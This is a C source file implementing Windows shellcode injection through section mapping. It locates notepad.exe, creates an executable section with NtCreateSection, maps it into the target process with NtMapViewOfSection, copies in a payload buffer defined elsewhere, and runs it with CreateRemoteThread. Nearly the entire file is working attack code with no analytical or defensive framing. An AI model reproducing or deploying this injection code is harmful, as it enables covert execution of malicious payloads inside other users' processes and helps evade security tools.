#include "Defines.h"


DWORD FindPID( LPCSTR procName ) {

    HANDLE hSnapshot = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
    if ( hSnapshot == INVALID_HANDLE_VALUE ) {
        fprintf( stderr, "[-] CreateToolhelp32Snapshot failed. Error: %lu\n", GetLastError() );
        return 0;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof( PROCESSENTRY32 );

    DWORD pid = 0;
    if ( Process32First( hSnapshot, &pe32 ) ) {
        do {
            if ( strcmp( pe32.szExeFile, procName ) == 0 ) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while ( Process32Next( hSnapshot, &pe32 ) );
    }

    CloseHandle( hSnapshot );

    return pid;
}

BOOL MapViewInject( HANDLE hProcess, LPVOID shellcodeAddr, SIZE_T shellcodeSize ) {

    HMODULE hNtdll = GetModuleHandleA( "ntdll.dll" );
    if ( !hNtdll ) {
        fprintf( stderr, "[-] GetModuleHandleA failed. Error: %lu\n", GetLastError() );
        return FALSE;
    }

    fnNtCreateSection NtCreateSection = ( fnNtCreateSection )GetProcAddress( hNtdll, "NtCreateSection" );
    if ( !NtCreateSection ) {
        fprintf( stderr, "[-] GetProcAddress failed. Error: %lu\n", GetLastError() );
        return FALSE;
    }

    fnNtMapViewOfSection NtMapViewOfSection = ( fnNtMapViewOfSection )GetProcAddress( hNtdll, "NtMapViewOfSection" );
    if ( !NtMapViewOfSection ) {
        fprintf( stderr, "[-] GetProcAddress failed. Error: %lu\n", GetLastError() );
        return FALSE;
    }

    fnNtUnmapViewOfSection NtUnmapViewOfSection = ( fnNtUnmapViewOfSection )GetProcAddress( hNtdll, "NtUnmapViewOfSection" );
    if ( !NtUnmapViewOfSection ) {
        fprintf( stderr, "[-] GetProcAddress failed. Error: %lu\n", GetLastError() );
        return FALSE;
    }

    NTSTATUS status = 0;
    HANDLE hSection = NULL;
    LARGE_INTEGER maxSize = { 0 };
    maxSize.QuadPart = shellcodeSize;

    status = NtCreateSection( &hSection, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL );
    if ( !NT_SUCCESS( status ) ) {
        fprintf( stderr, "[-] NtCreateSection failed. Status: 0x%lx\n", status );
        return FALSE;
    }

    PVOID pLocalSectionAddress = NULL;
    SIZE_T viewSize = 0;
    status = NtMapViewOfSection( hSection, GetCurrentProcess(), &pLocalSectionAddress, 0, 0, NULL, &viewSize, ViewUnmap, 0, PAGE_READWRITE );
    if ( !NT_SUCCESS( status ) ) {
        fprintf( stderr, "[-] NtMapViewOfSection failed. Status: 0x%lx\n", status );
        CloseHandle( hSection );
        return FALSE;
    }

    memcpy( pLocalSectionAddress, shellcodeAddr, shellcodeSize );

    PVOID pRemoteSectionAddress = NULL;
    status = NtMapViewOfSection( hSection, hProcess, &pRemoteSectionAddress, 0, 0, NULL, &viewSize, ViewUnmap, 0, PAGE_EXECUTE_READ );
    if ( !NT_SUCCESS( status ) ) {
        fprintf( stderr, "[-] NtMapViewOfSection failed. Status: 0x%lx\n", status );
        NtUnmapViewOfSection( GetCurrentProcess(), pLocalSectionAddress );
        CloseHandle( hSection );
        return FALSE;
    }

    HANDLE hThread = CreateRemoteThread( hProcess, NULL, 0, ( LPTHREAD_START_ROUTINE )pRemoteSectionAddress, NULL, 0, NULL );
    if ( !hThread ) {
        fprintf( stderr, "[-] CreateRemoteThread failed. Error: %lu\n", GetLastError() );
        NtUnmapViewOfSection( GetCurrentProcess(), pLocalSectionAddress );
        NtUnmapViewOfSection( hProcess, pRemoteSectionAddress );
        CloseHandle( hSection );
        return FALSE;
    }

    WaitForSingleObject( hThread, INFINITE );

    return TRUE;
}

int main( void ) {

    LPCSTR procName = "notepad.exe";
    DWORD pid = FindPID( procName );
    if ( !pid ) {
        fprintf( stderr, "[-] Could not find process: %s\n", procName );
        return 1;
    }

    printf( "[+] Found process %s with PID: %lu\n", procName, pid );


    HANDLE hProcess = OpenProcess( PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, pid );

    if ( !hProcess ) {
        fprintf( stderr, "[-] OpenProcess failed. Error: %lu\n", GetLastError() );
        return 1;
    }

    if ( !MapViewInject( hProcess, payload, payloadSize ) ) {
        fprintf( stderr, "[-] MapViewInject failed.\n" );
        return 1;
    }

    printf( "[+] MapViewInject succeeded.\n" );

    return 0;
}